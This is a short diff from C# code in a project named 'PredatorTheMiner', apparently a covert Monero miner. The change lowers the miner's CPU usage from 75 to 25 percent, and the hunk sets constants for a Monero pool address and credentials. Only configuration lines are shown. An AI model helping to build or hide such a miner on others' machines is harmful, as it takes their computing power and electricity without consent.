@@ -35,7 +35,7 @@ namespace PredatorTheMiner
 
 				const string Pool = "pool.monero.hashvault.pro:443";
 				const string user = "user name";
-				const string cpu_usage = "75"; //25 50 75
+				const string cpu_usage = "25"; //25 50 75
 				const string password = "x";
 				/* Данные для майнера */
 				
